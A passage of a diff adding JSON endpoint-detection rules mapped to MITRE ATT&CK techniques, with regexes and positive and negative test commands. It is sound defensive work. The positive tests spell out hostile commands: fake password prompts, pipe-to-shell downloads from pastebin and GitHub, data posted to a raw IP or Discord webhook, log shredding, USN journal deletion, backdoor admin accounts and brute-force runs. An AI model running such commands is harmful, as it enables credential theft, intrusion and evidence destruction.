+   "tags": [
+    "gap2",
+    "phishing-prompt"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/osascript",
+      "command": "osascript -e 'display dialog \\\"Enter your password to update\\\" default answer \\\"\\\" with hidden answer'"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/osascript",
+      "command": "osascript -e 'display dialog \\\"Done\\\"'"
+     },
+     {
+      "executable": "/usr/bin/osascript",
+      "command": "osascript -e 'tell application \\\"Finder\\\" to activate'"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-win-ps-credential-prompt",
+   "name": "PowerShell credential prompt",
+   "description": "PromptForCredential or Get-Credential with a spoofed message, a GUI credential-harvest pattern.",
+   "tactic": "Collection",
+   "technique": "T1056.002",
+   "technique_name": "Input Capture: GUI Input Capture",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(^|[\\\\/])(powershell|pwsh)(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(promptforcredential\\(|get-credential\\s+.*-message)"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "credential-prompt"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell -c $h=$host.ui.PromptForCredential('Windows Security','Enter creds','','')"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell Get-Process"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell Get-Credential"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-any-privesc-exploit-tool-names",
+   "name": "Known privilege-escalation exploit tool name",
+   "description": "Command line names a well-known local privilege-escalation exploit or potato tool (PrintSpoofer, JuicyPotato, GodPotato, PwnKit, DirtyPipe, DirtyCow). Name-based, so trivially evaded.",
+   "tactic": "Privilege Escalation",
+   "technique": "T1068",
+   "technique_name": "Exploitation for Privilege Escalation",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(^|[\\\\/\\s])(printspoofer|juicypotato|godpotato|sweetpotato|roguepotato|hotpotato|pwnkit|cve-2021-4034|cve-2022-0847|dirtypipe|dirtycow|dirty_sock|badpotato|efspotato)\\d*(\\.exe|\\.sh|\\.py|\\b)"
+   },
+   "tags": [
+    "gap2",
+    "privesc-tools"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Users\\a\\Downloads\\PrintSpoofer64.exe",
+      "command": "PrintSpoofer64.exe -i -c cmd"
+     },
+     {
+      "executable": "/tmp/x",
+      "command": "./dirtypipe /usr/bin/su"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/vim",
+      "command": "vim notes.txt"
+     },
+     {
+      "executable": "/usr/bin/grep",
+      "command": "grep potato recipes.txt"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-any-local-group-enum",
+   "name": "Local administrator group enumeration",
+   "description": "net localgroup administrators, Get-LocalGroupMember, getent group sudo or dscl reading the admin group. Common in admin work, so informational.",
+   "tactic": "Discovery",
+   "technique": "T1069.001",
+   "technique_name": "Permission Groups Discovery: Local Groups",
+   "severity": "low",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(net1?(\\.exe)?\\s+localgroup(\\s+(administrators|remote desktop users))?\\s*$|net1?(\\.exe)?\\s+localgroup\\s+(administrators|remote desktop users)\\b|get-localgroupmember|getent\\s+group\\s+(sudo|wheel|admin)\\b|dscl\\s+\\.\\s+-read\\s+/groups/admin)"
+   },
+   "tags": [
+    "gap2",
+    "discovery"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\net.exe",
+      "command": "net localgroup administrators"
+     },
+     {
+      "executable": "/usr/bin/getent",
+      "command": "getent group sudo"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\net.exe",
+      "command": "net use Z: \\\\srv\\share"
+     },
+     {
+      "executable": "/usr/bin/getent",
+      "command": "getent hosts example.com"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-any-secure-delete-evidence",
+   "name": "Secure deletion of logs, history or free space",
+   "description": "shred of log or history files, sdelete, or cipher /w. Anti-forensic file deletion; admins also use these for data hygiene.",
+   "tactic": "Defense Evasion",
+   "technique": "T1070.004",
+   "technique_name": "Indicator Removal: File Deletion",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "any": [
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "regex",
+        "pattern": "(^|[\\\\/])(shred|wipe|srm)(\\.exe)?$"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "(/var/log/|\\.bash_history|\\.zsh_history|\\.viminfo|auth\\.log)"
+       }
+      ]
+     },
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "regex",
+        "pattern": "(^|[\\\\/])(sdelete|sdelete64)(\\.exe)?$"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "\\s-[a-z]*[rpsz]"
+       }
+      ]
+     },
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "regex",
+        "pattern": "(^|[\\\\/])(cipher)(\\.exe)?$"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "\\s/w:[a-z]:\\\\*\\s*$"
+       }
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "anti-forensics"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/shred",
+      "command": "shred -u /var/log/auth.log"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\cipher.exe",
+      "command": "cipher.exe /w:C:\\\\"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/shred",
+      "command": "shred -u /tmp/scratch.bin"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\cipher.exe",
+      "command": "cipher.exe /e secret.txt"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-win-usn-journal-delete",
+   "name": "NTFS USN journal deleted",
+   "description": "fsutil usn deletejournal removes file-change history that forensic tools rely on.",
+   "tactic": "Defense Evasion",
+   "technique": "T1070",
+   "technique_name": "Indicator Removal",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(^|[\\\\/])(fsutil)(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "usn\\s+deletejournal"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "usn"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\fsutil.exe",
+      "command": "fsutil usn deletejournal /d C:"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\fsutil.exe",
+      "command": "fsutil usn queryjournal C:"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\fsutil.exe",
+      "command": "fsutil volume diskfree C:"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-win-ps-web-post-to-ip",
+   "name": "PowerShell posts data to a raw IP web endpoint",
+   "description": "Invoke-WebRequest/Invoke-RestMethod or WebClient POST/upload to an http(s) URL with an IP literal host, a basic C2 or exfil web channel.",
+   "tactic": "Command and Control",
+   "technique": "T1071.001",
+   "technique_name": "Application Layer Protocol: Web Protocols",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(^|[\\\\/])(powershell|pwsh)(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(invoke-webrequest|invoke-restmethod|iwr|irm|uploadstring|uploaddata|uploadfile)"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "https?://\\d{1,3}(\\.\\d{1,3}){3}[:/]"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(-method\\s+post|-body|upload(string|data|file))"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "web-c2"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell iwr http://203.0.113.4:8080/b -Method Post -Body $d"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell iwr https://example.com/ -Method Post -Body $d"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell iwr http://203.0.113.4/file.zip"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-net-common-c2-teamserver-ports",
+   "name": "Outbound connection to a common C2 framework port",
+   "description": "Destination port is 4444, 50050, 31337 or 1337 on a non-private destination: default ports for Metasploit handlers, Cobalt Strike team servers and similar. Port-only heuristic.",
+   "tactic": "Command and Control",
+   "technique": "T1071",
+   "technique_name": "Application Layer Protocol",
+   "severity": "low",
+   "os": "any",
+   "event_type": "network",
+   "match": {
+    "all": [
+     {
+      "field": "destination",
+      "op": "regex",
+      "pattern": ":(4444|50050|31337|1337)$"
+     },
+     {
+      "not": {
+       "field": "destination",
+       "op": "regex",
+       "pattern": "^(10\\.|192\\.168\\.|172\\.(1[6-9]|2\\d|3[01])\\.|127\\.|localhost)"
+      }
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "c2-ports"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "destination": "203.0.113.50:4444"
+     },
+     {
+      "destination": "198.51.100.2:50050"
+     }
+    ],
+    "negative": [
+     {
+      "destination": "10.0.0.5:4444"
+     },
+     {
+      "destination": "example.com:443"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-auth-default-account-success",
+   "name": "Successful login by a default or guest account",
+   "description": "A successful authentication by guest, defaultaccount, support_388945a0 or similar built-in accounts that are normally disabled.",
+   "tactic": "Initial Access",
+   "technique": "T1078.001",
+   "technique_name": "Valid Accounts: Default Accounts",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "auth",
+   "match": {
+    "all": [
+     {
+      "field": "user",
+      "op": "in",
+      "patterns": [
+       "guest",
+       "defaultaccount",
+       "wdagutilityaccount",
+       "support_388945a0",
+       "admin",
+       "test",
+       "user1",
+       "pi",
+       "ubnt",
+       "vagrant",
+       "cisco"
+      ]
+     },
+     {
+      "field": "outcome",
+      "op": "in",
+      "patterns": [
+       "success"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "default-accounts"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "attrs": {
+       "user": "guest",
+       "source_ip": "203.0.113.7",
+       "method": "network",
+       "outcome": "success"
+      }
+     }
+    ],
+    "negative": [
+     {
+      "attrs": {
+       "user": "guest",
+       "source_ip": "203.0.113.7",
+       "method": "network",
+       "outcome": "failure"
+      }
+     },
+     {
+      "attrs": {
+       "user": "ann",
+       "source_ip": "10.0.0.2",
+       "method": "publickey",
+       "outcome": "success"
+      }
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-win-runas-savecred",
+   "name": "runas with /savecred",
+   "description": "runas /savecred /user: stores and reuses a local or domain account's credentials for execution as that account.",
+   "tactic": "Persistence",
+   "technique": "T1078.003",
+   "technique_name": "Valid Accounts: Local Accounts",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(^|[\\\\/])(runas)(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "/savecred"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "/user:"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "runas"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\runas.exe",
+      "command": "runas /savecred /user:administrator cmd.exe"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\runas.exe",
+      "command": "runas /user:administrator cmd.exe"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\runas.exe",
+      "command": "runas /?"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-cloud-cli-key-based-login",
+   "name": "Cloud CLI configured with static credentials",
+   "description": "az login --service-principal, gcloud auth activate-service-account or aws configure set of an access key: a cloud account becomes usable from this host. Routine for automation, so informational.",
+   "tactic": "Defense Evasion",
+   "technique": "T1078.004",
+   "technique_name": "Valid Accounts: Cloud Accounts",
+   "severity": "low",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(^|[\\\\/])(az|gcloud|aws)(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(login\\s+.*--service-principal|auth\\s+activate-service-account|configure\\s+set\\s+aws_(access_key_id|secret_access_key))"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "cloud-auth"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/az",
+      "command": "az login --service-principal -u app -p secret --tenant t"
+     },
+     {
+      "executable": "/usr/bin/aws",
+      "command": "aws configure set aws_access_key_id AKIAIOSFODNN7EXAMPLE"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/az",
+      "command": "az account list"
+     },
+     {
+      "executable": "/usr/bin/aws",
+      "command": "aws s3 ls"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-any-domain-account-enum",
+   "name": "Domain account enumeration",
+   "description": "net user /domain, dsquery user, Get-ADUser -Filter * or an ldapsearch for user objects lists directory accounts.",
+   "tactic": "Discovery",
+   "technique": "T1087.002",
+   "technique_name": "Account Discovery: Domain Account",
+   "severity": "low",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(net1?(\\.exe)?\\s+(user|group)\\s+.*/domain|dsquery\\s+user|get-aduser\\s+(-filter\\s+\\*|-identity)|ldapsearch\\s.*objectclass=(user|person)|adfind\\s)"
+   },
+   "tags": [
+    "gap2",
+    "discovery"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\net.exe",
+      "command": "net user /domain"
+     },
+     {
+      "executable": "/usr/bin/ldapsearch",
+      "command": "ldapsearch -x -b dc=corp,dc=local objectClass=user"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\net.exe",
+      "command": "net use"
+     },
+     {
+      "executable": "/usr/bin/ldapsearch",
+      "command": "ldapsearch -x -b dc=corp,dc=local objectClass=printer"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-any-internal-proxy-forwarder",
+   "name": "netsh port proxy configured",
+   "description": "netsh interface portproxy add relays a listening port to another host and turns the machine into an internal proxy.",
+   "tactic": "Command and Control",
+   "technique": "T1090.001",
+   "technique_name": "Proxy: Internal Proxy",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(^|[\\\\/])(netsh)(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "portproxy\\s+add\\s+v[46]tov[46]"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "proxy"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\netsh.exe",
+      "command": "netsh interface portproxy add v4tov4 listenport=8080 connectaddress=10.0.0.9 connectport=80"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\netsh.exe",
+      "command": "netsh interface portproxy show all"
+     },
+     {
+      "executable": "/usr/bin/socat",
+      "command": "socat - TCP:10.0.0.9:80"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-any-multihop-tor-proxychains",
+   "name": "Tor or proxychains traffic relay started",
+   "description": "tor, torify or proxychains runs on the host, routing traffic through multiple hops.",
+   "tactic": "Command and Control",
+   "technique": "T1090.003",
+   "technique_name": "Proxy: Multi-hop Proxy",
+   "severity": "low",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "field": "executable",
+    "op": "regex",
+    "pattern": "(^|[\\\\/])(tor|torify|tor-browser|proxychains|proxychains4)(\\.exe)?$"
+   },
+   "tags": [
+    "gap2",
+    "proxy"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/tor",
+      "command": "tor -f /tmp/torrc"
+     },
+     {
+      "executable": "/usr/bin/proxychains4",
+      "command": "proxychains4 nmap 10.0.0.1"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/torsocks-docs",
+      "command": "less torsocks-docs"
+     },
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl https://example.com"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-any-privileged-group-add",
+   "name": "User added to a privileged local group",
+   "description": "usermod/gpasswd/adduser adding to sudo, wheel, admin, docker or root; net localgroup administrators /add; dseditgroup adding to admin.",
+   "tactic": "Persistence",
+   "technique": "T1098",
+   "technique_name": "Account Manipulation",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "any": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "usermod\\s+.*-a?g\\s*\\S*(sudo|wheel|admin|root)\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(gpasswd\\s+(-a|--add)\\s+\\S+\\s+(sudo|wheel|admin)\\b|adduser\\s+\\S+\\s+(sudo|wheel|admin)\\b)"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "localgroup\\s+(administrators|remote desktop users)\\s+\\S+\\s+/add"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "dseditgroup\\s.*-a\\s+\\S+\\s+(-t\\s+user\\s+)?admin\\b"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "accounts"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/sbin/usermod",
+      "command": "usermod -aG sudo backdoor"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\net.exe",
+      "command": "net localgroup administrators evil /add"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/sbin/usermod",
+      "command": "usermod -aG developers alice"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\net.exe",
+      "command": "net localgroup administrators"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-cloud-additional-credentials-created",
+   "name": "Additional cloud credential created",
+   "description": "aws iam create-access-key, az ad sp/app credential reset or gcloud iam service-accounts keys create adds a new secret for an existing identity.",
+   "tactic": "Persistence",
+   "technique": "T1098.001",
+   "technique_name": "Account Manipulation: Additional Cloud Credentials",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(^|[\\\\/])(aws|az|gcloud)(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(iam\\s+create-access-key|create-login-profile|ad\\s+(sp|app)\\s+credential\\s+(reset|create)|iam\\s+service-accounts\\s+keys\\s+create)"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "cloud"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/aws",
+      "command": "aws iam create-access-key --user-name admin"
+     },
+     {
+      "executable": "/usr/bin/gcloud",
+      "command": "gcloud iam service-accounts keys create k.json --iam-account s@p.iam.gserviceaccount.com"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/aws",
+      "command": "aws iam list-access-keys"
+     },
+     {
+      "executable": "/usr/bin/gcloud",
+      "command": "gcloud iam service-accounts list"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-k8s-clusterrole-binding-admin",
+   "name": "Cluster-admin or broad role bound",
+   "description": "kubectl create clusterrolebinding/rolebinding to cluster-admin, admin or edit grants broad cluster rights.",
+   "tactic": "Privilege Escalation",
+   "technique": "T1098.006",
+   "technique_name": "Account Manipulation: Additional Container Cluster Roles",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(^|[\\\\/])(kubectl|oc)(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "create\\s+(cluster)?rolebinding\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "--(cluster)?role[= ](cluster-admin|admin|edit)\\b"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "k8s"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/local/bin/kubectl",
+      "command": "kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --serviceaccount=default:default"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/local/bin/kubectl",
+      "command": "kubectl create clusterrolebinding v --clusterrole=view --user=bob"
+     },
+     {
+      "executable": "/usr/local/bin/kubectl",
+      "command": "kubectl get clusterrolebindings"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-any-web-service-staging-pipe",
+   "name": "Script fetched from a paste or raw-content service and piped to an interpreter",
+   "description": "curl/wget/iwr to pastebin raw, gist, raw.githubusercontent or similar piped to sh/bash/python or iex.",
+   "tactic": "Command and Control",
+   "technique": "T1102",
+   "technique_name": "Web Service",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(pastebin\\.com/raw|gist\\.githubusercontent\\.com|raw\\.githubusercontent\\.com|paste\\.ee/r|hastebin\\.com/raw|ghostbin|rentry\\.co/\\S+/raw)"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(\\|\\s*(sudo\\s+)?(ba|z)?sh\\b|\\|\\s*python3?\\b|\\|\\s*iex\\b|invoke-expression|iex\\s*\\()"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "web-service"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/bash",
+      "command": "bash -c 'curl -s https://pastebin.com/raw/AbC123 | sh'"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell iex (iwr https://raw.githubusercontent.com/x/y/main/a.ps1)"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl -s https://raw.githubusercontent.com/x/y/main/README.md -o README.md"
+     },
+     {
+      "executable": "/usr/bin/bash",
+      "command": "bash ./install.sh"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-any-chat-bot-api-c2",
+   "name": "Command line talks to a chat-bot API for tasking and reply",
+   "description": "A command uses Telegram bot getUpdates/sendMessage or a Discord/Slack webhook, a bidirectional chat-service C2 pattern.",
+   "tactic": "Command and Control",
+   "technique": "T1102.002",
+   "technique_name": "Web Service: Bidirectional Communication",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(api\\.telegram\\.org/bot\\S+/(getupdates|sendmessage|senddocument)|discord(app)?\\.com/api/webhooks/\\d+|hooks\\.slack\\.com/services/)"
+   },
+   "tags": [
+    "gap2",
+    "chat-c2"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl -s https://api.telegram.org/bot123:AAA/getUpdates"
+     },
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl -X POST https://discord.com/api/webhooks/123456/abc -d @out.txt"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl -s https://api.github.com/repos/x/y"
+     },
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl https://telegram.org"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-any-password-guessing-tools",
+   "name": "Online password-guessing tool run",
+   "description": "hydra, medusa, ncrack, patator or crackmapexec with a password list targets a remote service.",
+   "tactic": "Credential Access",
+   "technique": "T1110.001",
+   "technique_name": "Brute Force: Password Guessing",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(^|[\\\\/])(hydra|medusa|ncrack|patator|crackmapexec|nxc|kerbrute)(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(\\s-[pPlL]\\s|--password|--passwords|passwordspray|bruteuser|\\sspray)"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "bruteforce"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/hydra",
+      "command": "hydra -l root -P rockyou.txt ssh://10.0.0.5"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/hydra",
+      "command": "hydra -h"
+     },
+     {
+      "executable": "/usr/bin/ssh",
+      "command": "ssh root@10.0.0.5"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-any-offline-hash-cracking",
+   "name": "Offline password-cracking tool run",
+   "description": "hashcat or john runs with a hash mode or wordlist against a hash file.",
+   "tactic": "Credential Access",
+   "technique": "T1110.002",
+   "technique_name": "Brute Force: Password Cracking",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(^|[\\\\/])(hashcat|john|johntheripper|hashcat64)(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(-m\\s*\\d+|--wordlist|--format=|-a\\s*[0-9]\\s)"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "cracking"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/hashcat",
+      "command": "hashcat -m 1000 -a 0 hashes.txt rockyou.txt"
+     },
+     {
+      "executable": "/usr/bin/john",
+      "command": "john --wordlist=rockyou.txt --format=nt hashes.txt"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/hashcat",
+      "command": "hashcat --version"
+     },
+     {
+      "executable": "/usr/bin/john",
+      "command": "john --help"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-win-reg-add-disable-admin-tools",
+   "name": "reg add disables admin tools or policy UI",
+   "description": "reg add sets DisableTaskMgr, DisableRegistryTools, DisableCMD, NoControlPanel or similar policy values to 1, hindering response.",
+   "tactic": "Defense Evasion",
+   "technique": "T1112",
+   "technique_name": "Modify Registry",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(^|[\\\\/])(reg)(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\badd\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\b(disabletaskmgr|disableregistrytools|disablecmd|nocontrolpanel|norun|nofolderoptions|nodispbackgroundpage)\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "/d\\s+1\\b"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "registry"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\reg.exe",
+      "command": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\reg.exe",
+      "command": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 0 /f"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\reg.exe",
+      "command": "reg query HKCU\\Software"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-any-domain-account-create",
+   "name": "Domain or directory account created from the command line",
+   "description": "net user /add /domain, New-ADUser, dsadd user or ldapadd of a user creates a directory account.",
+   "tactic": "Persistence",
+   "technique": "T1136.002",
+   "technique_name": "Create Account: Domain Account",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(net1?(\\.exe)?\\s+user\\s+\\S+\\s+\\S*\\s*/add\\s+.*/domain|net1?(\\.exe)?\\s+user\\s+\\S+\\s+.*/domain\\s+.*/add|new-aduser\\s|dsadd\\s+user\\s|ldapadd\\s)"
+   },
+   "tags": [
+    "gap2",
+    "accounts"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\net.exe",
+      "command": "net user svc_backup P@ssw0rd1 /add /domain"
+     },
